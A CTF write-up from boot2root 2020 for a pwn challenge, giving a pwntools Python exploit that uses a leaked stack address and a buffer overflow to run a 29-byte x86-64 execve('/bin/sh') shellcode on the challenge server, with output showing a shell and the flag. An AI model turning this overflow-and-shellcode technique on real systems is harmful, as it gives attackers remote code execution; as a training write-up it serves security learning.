# boot2root 2020

## Shellcode loooong

> 495
>
> I dont like long long shellcodes keep them short and crispy
>
> `nc 35.238.225.156 1008`
>
> Author: TheBadGuy
> 
> [short](short)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _shellcode_


## Summary

This is 100% identical to [shellcode](https://github.com/datajerk/ctf-write-ups/tree/master/boot2root2020/shellcode), even the md5sums are the same.  See [shellcode](https://github.com/datajerk/ctf-write-ups/tree/master/boot2root2020/shellcode) for the write-up.

Someone fucked up.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./short')

if args.REMOTE:
    p = remote('35.238.225.156', 1008)
else:
    p = process(binary.path)

p.recvuntil('supposed to[')
_ = p.recvuntil(']')
buff = int(_[:-1],16)
log.info('buff: ' + hex(buff))

# http://shell-storm.org/shellcode/files/shellcode-905.php
# 29 bytes
shellcode  = b''
shellcode += b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf'
shellcode += b'\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54'
shellcode += b'\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

payload  = b''
payload += 0x18 * b'A'
payload += p64(buff + 0x18 + 8)
payload += shellcode

p.sendafter('answer now\n',payload)
p.interactive()
```

Different port number and binary name is all that differs.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/shellcode_loooong/short'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 35.238.225.156 on port 1008: Done
[*] buff: 0x7ffff75ce360
[*] Switching to interactive mode
$ cat flag
b00t2root{sH0rT3r_shellZ_c0d3}
```
